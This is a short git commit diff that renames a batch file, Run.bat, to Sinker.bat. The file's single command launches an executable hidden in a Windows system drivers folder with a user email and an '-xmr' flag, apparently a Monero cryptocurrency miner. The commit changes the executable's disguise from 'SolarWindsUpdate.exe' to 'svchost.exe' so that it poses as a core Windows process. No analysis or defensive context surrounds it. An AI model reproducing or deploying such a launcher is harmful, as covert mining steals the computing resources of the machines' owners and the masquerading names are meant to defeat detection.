72aa680c8fb0237bc4ebac8db7913906594b2492
diggles9991 <diggles9991@gmail.com>
2017-07-13 21:55:16 +1000

    Update and rename Run.bat to Sinker.bat

--- Run.bat
+++
@@ -1,1 +0,0 @@
-C:\Windows\System32\drivers\en-US\etc\SolarWindsUpdate.exe -user diggles9991@gmail.com -xmr
---
+++ Sinker.bat
@@ -0,0 +1,1 @@
+C:\Windows\System32\drivers\en-US\etc\svchost.exe -user diggles9991@gmail.com -xmr
